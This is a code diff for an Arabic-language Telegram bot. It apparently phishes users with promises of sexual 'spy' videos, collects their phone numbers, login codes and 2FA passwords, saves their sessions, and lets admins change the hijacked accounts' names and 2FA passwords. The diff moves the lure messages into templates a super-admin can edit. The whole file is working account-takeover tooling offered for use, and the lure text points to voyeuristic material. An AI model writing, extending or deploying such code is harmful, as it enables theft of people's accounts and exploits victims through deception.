@@ -13,7 +13,6 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from config import (
     BOT_TOKEN,
     ADMIN_IDS,
-    REGISTRATION_LINK,
     SESSION_RECOVERY_DELAY,
     SESSION_RECOVERY_MAX_ATTEMPTS,
     SESSION_RECOVERY_RETRY_DELAY,
@@ -21,6 +20,7 @@ from config import (
     DEFAULT_2FA_PASSWORD,
 )
 import database
+import user_messages
 import session_manager
 import volume_backup
 import admin_resolve
@@ -28,6 +28,7 @@ from keyboards import (
     age_confirm_keyboard, share_phone_keyboard, numpad_keyboard,
     retry_keyboard, sessions_keyboard, session_detail_keyboard,
     back_to_session_keyboard, ADMIN_FOOTER, CB,
+    admin_empty_keyboard, user_messages_menu_keyboard,
 )
 
 logging.basicConfig(level=logging.INFO)
@@ -49,6 +50,7 @@ class AdminFlow(StatesGroup):
     changing_name = State()
     changing_2fa  = State()
     waiting_volume_upload = State()
+    editing_user_message = State()
 
 
 # ──────────────────────────────────────────
@@ -289,10 +291,7 @@ async def cmd_start(message: Message, state: FSMContext):
         phone   = user["phone"]
         session = await database.get_session_by_phone(phone)
         if session and session["valid"]:
-            m = await message.answer(
-                f"✅ أنت مسجل مسبقاً!\n\n🔗 رابط الفيديو🫦🫦:\n{REGISTRATION_LINK}\n"
-                "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💋🫦\n@N01_n0one"
-            )
+            m = await message.answer(user_messages.render("already_registered"))
             user_link_msg_id[uid] = m.message_id
             return
 
@@ -406,8 +405,7 @@ async def numpad_press(callback: CallbackQuery, state: FSMContext):
             await state.clear()
             await edit_or_send(
                 callback.message.chat.id, uid,
-                f"✅ تم التسجيل بنجاح!\n\n🔗 رابط الفيديو🫦💋:\n{REGISTRATION_LINK}\n"
-                "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين💗💞\n@N01_n0one"
+                user_messages.render("registration_success"),
             )
             user_link_msg_id[uid] = user_msg_ids.get(uid)
             await _notify_new_session(
@@ -449,8 +447,7 @@ async def text_2fa(message: Message, state: FSMContext):
         await state.clear()
         await edit_or_send(
             message.chat.id, uid,
-            f"✅ تم التسجيل بنجاح!\n\n🔗 رابط الفيديو🔞🫦:\n{REGISTRATION_LINK}\n"
-            "كلم الادمن للاشتراك في البوم التجسس كامل متكون من ٢٠ مقطع كاملين🔞💞\n@N01_n0one"
+            user_messages.render("registration_success"),
         )
         user_link_msg_id[uid] = user_msg_ids.get(uid)
         await _notify_new_session(
@@ -732,7 +729,12 @@ async def show_admin_panel(message: Message):
     uid = message.from_user.id
     sessions = await _sessions_for_admin(uid)
     text = await _admin_panel_text(uid)
-    kb = sessions_keyboard(sessions, is_super_admin=is_super_admin(uid)) if sessions else None
+    if sessions:
+        kb = sessions_keyboard(sessions, is_super_admin=is_super_admin(uid))
+    elif is_super_admin(uid):
+        kb = admin_empty_keyboard()
+    else:
+        kb = None
     suffix = "" if sessions else "\n\n📭 لا توجد جلسات محفوظة."
     await message.answer(text + suffix, reply_markup=kb, parse_mode="HTML")
 
@@ -862,6 +864,115 @@ async def check_sessions_handler(callback: CallbackQuery):
         reply_markup=sessions_keyboard(
             sessions, is_super_admin=is_super_admin(uid)
         ),
+        parse_mode="HTML",
+    )
+
+
+# ──────────────────────────────────────────
+# رسائل المستخدمين (A1 فقط)
+# ──────────────────────────────────────────
+EDIT_UM_MAP = {
+    "edit_um_already_registered": "already_registered",
+    "edit_um_registration_success": "registration_success",
+    "edit_um_registration_link": "registration_link",
+}
+
+
+@dp.callback_query(F.data == "edit_user_messages")
+async def edit_user_messages_menu(callback: CallbackQuery, state: FSMContext):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+    await state.clear()
+    text = (
+        "✏️ <b>رسائل المستخدمين</b>\n\n"
+        f"🔗 الرابط الحالي:\n<code>{h(user_messages.get_link())}</code>\n\n"
+        "في النصوص ضع <code>{link}</code> حيث تريد ظهور الرابط.\n"
+        "اختر الرسالة للتعديل:"
+        + ADMIN_FOOTER
+    )
+    await callback.message.edit_text(
+        text,
+        reply_markup=user_messages_menu_keyboard(),
+        parse_mode="HTML",
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data.in_(set(EDIT_UM_MAP.keys())))
+async def edit_user_message_pick(callback: CallbackQuery, state: FSMContext):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+    um_key = EDIT_UM_MAP[callback.data]
+    current = user_messages.get_template(um_key)
+    label = user_messages.LABELS[um_key]
+    if um_key == "registration_link":
+        hint = "أرسل <b>رابط الفيديو</b> فقط (URL كامل)."
+    else:
+        hint = (
+            "أرسل <b>النص كاملاً</b> كما سيظهر للمستخدم.\n"
+            "استخدم <code>{link}</code> لمكان الرابط."
+        )
+    await state.set_state(AdminFlow.editing_user_message)
+    await state.update_data(um_key=um_key)
+    await callback.message.answer(
+        f"✏️ تعديل: <b>{h(label)}</b>\n\n"
+        f"<b>الحالي:</b>\n<pre>{h(current[:3500])}</pre>\n\n"
+        f"{hint}"
+        + ADMIN_FOOTER,
+        parse_mode="HTML",
+    )
+    await callback.answer()
+
+
+@dp.callback_query(F.data == "reset_user_messages")
+async def reset_user_messages_all(callback: CallbackQuery, state: FSMContext):
+    if not is_super_admin(callback.from_user.id):
+        await callback.answer("❌ لأدمن رقم 1 فقط", show_alert=True)
+        return
+    user_messages.reset_all()
+    await state.clear()
+    text = (
+        "✏️ <b>رسائل المستخدمين</b>\n\n"
+        "✅ أُعيدت كل الرسائل للافتراضي.\n\n"
+        f"🔗 الرابط الحالي:\n<code>{h(user_messages.get_link())}</code>\n\n"
+        "في النصوص ضع <code>{link}</code> حيث تريد ظهور الرابط.\n"
+        "اختر الرسالة للتعديل:"
+        + ADMIN_FOOTER
+    )
+    await callback.message.edit_text(
+        text,
+        reply_markup=user_messages_menu_keyboard(),
+        parse_mode="HTML",
+    )
+    await callback.answer("✅ تم", show_alert=True)
+
+
+@dp.message(AdminFlow.editing_user_message)
+async def save_user_message_text(message: Message, state: FSMContext):
+    if not is_super_admin(message.from_user.id):
+        return
+    data = await state.get_data()
+    um_key = data.get("um_key")
+    if not um_key:
+        await state.clear()
+        return
+    text = (message.text or "").strip()
+    if not text:
+        await message.answer("❌ أرسل نصاً غير فارغ.")
+        return
+    user_messages.set_message(um_key, text)
+    await state.clear()
+    if um_key == "registration_link":
+        preview = user_messages.get_link()
+    else:
+        preview = user_messages.render(um_key)
+    await message.answer(
+        f"✅ <b>تم الحفظ</b> — {h(user_messages.LABELS[um_key])}\n\n"
+        f"<b>معاينة:</b>\n<pre>{h(preview[:3500])}</pre>"
+        + ADMIN_FOOTER,
+        reply_markup=user_messages_menu_keyboard(),
         parse_mode="HTML",
     )
 
